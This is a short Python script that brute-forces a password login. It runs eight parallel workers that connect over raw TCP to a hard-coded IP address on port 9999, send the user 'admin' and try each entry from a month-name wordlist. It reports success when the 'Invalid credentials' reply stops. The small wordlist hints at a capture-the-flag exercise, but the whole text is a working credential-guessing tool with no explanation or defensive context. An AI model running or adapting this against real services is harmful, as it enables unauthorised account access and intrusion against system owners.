import sys
import socket
from multiprocessing import Pool as pool

THREADS = 8
HOST = '165.227.147.243'
PORT = 9999
WORDLIST = 'months.txt'


with open(WORDLIST, 'rb') as f:
    wordlist = f.readlines()


def make_a_guess(password):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((HOST, PORT))
        s.recv(1024)  # get login screen
        s.sendall(b"admin")
        s.recv(1024)  
        s.sendall(password)
        data = s.recv(1024)  # get result message
        print(data)
        s.close()
    if data.find(b'Invalid credentials') == -1:
        print('[!] Password found!', password.decode())
        sys.exit(0)


if __name__ == '__main__':
    print(f'[*] Starting the pool with {THREADS} threads...')
    p = pool(THREADS)
    p.map(make_a_guess, wordlist)
    print('[*] Done! Ending all threads.')